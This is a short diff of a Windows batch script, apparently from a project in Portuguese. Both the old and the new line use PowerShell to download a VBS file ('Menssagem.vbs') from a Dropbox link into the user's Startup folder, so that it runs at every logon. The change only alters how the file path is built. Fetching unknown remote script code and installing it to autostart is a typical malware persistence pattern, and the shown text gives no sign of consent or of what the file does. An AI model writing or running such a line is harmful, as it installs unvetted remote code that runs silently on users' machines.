@@ -546,8 +546,9 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbo
 endlocal
 
 :inicializar
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'Menssagem.vbs'))"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [Environment]::GetFolderPath('Startup') + '\Menssagem.vbs')"
 endlocal
+
 
 
 
